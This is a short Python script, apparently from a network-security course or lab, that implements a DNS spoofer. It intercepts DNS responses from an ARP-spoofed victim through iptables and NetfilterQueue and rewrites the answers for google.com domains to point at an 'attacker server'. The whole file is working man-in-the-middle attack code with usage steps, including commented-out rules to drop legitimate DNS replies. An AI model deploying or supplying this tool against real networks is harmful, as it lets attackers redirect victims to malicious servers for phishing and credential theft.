#   DNS Spoofing Application
#
#   Details -
#   DNS Spoofer that listens for a particular URL from
#   an ARP spoofed victim and sends them to your own Server
#   running on another machine.
#
#   Usage   -
#   1.  Set Config File
#   2.  Setup Apache Web Server
#   3.  Run ARP Spoofer
#   4.  Run DNS Spoofer
#
#   Author  Date        Description
#   GSM     NOV-09      Design to Code
#   GSM     NOV-14      Code Cleanup
#

#   Imports
import os
from scapy.all import *
from netfilterqueue import NetfilterQueue

#   Constants

#   Set Arguments

#   Setup DNS Table
dnshosts = {
    b"www.google.com.": "192.168.1.74",
    b"www.google.ca.": "192.168.1.74",
    b"google.com.": "192.168.1.74"
}

#   Modify Packet
def ModifyPacket ( packet ):

    website = packet[DNSQR].qname

    if ( website not in dnshosts ):
        print ( "[-] No Modification: ", website )
        return packet

    #   Reroute Website Address to Attacker Server
    packet[DNS].an = DNSRR ( rrname=website, rdata=dnshosts[website] )
    packet[DNS].ancount = 1

    #   Recalculate Length and CheckSum
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum

    return packet

#   Packet Processing
def ProcessPacket ( packet ):

    newpacket = IP ( packet.get_payload ( ) )

    if newpacket.haslayer ( DNSRR ):
        print ( "[o] Before: ", newpacket.summary ( ) )
        newpacket = ModifyPacket ( newpacket )
        print ( "[o] After: ", newpacket.summary ( ) )
        packet.set_payload ( bytes ( newpacket ) )

    packet.accept ( )

#   Main
os.system ( "iptables -I FORWARD -j NFQUEUE --queue-num 1" )

#   Block Legitimate Response Packet
#   os.system ( "iptables -A FORWARD -p udp --sport 53 -d 192.168.1.70 -j DROP" )
#   os.system ( "iptables -A FORWARD -p tcp --sport 53 -d 192.168.1.70 -j DROP" )

queue = NetfilterQueue ( )
queue.bind ( 1, ProcessPacket )
queue.run ( )
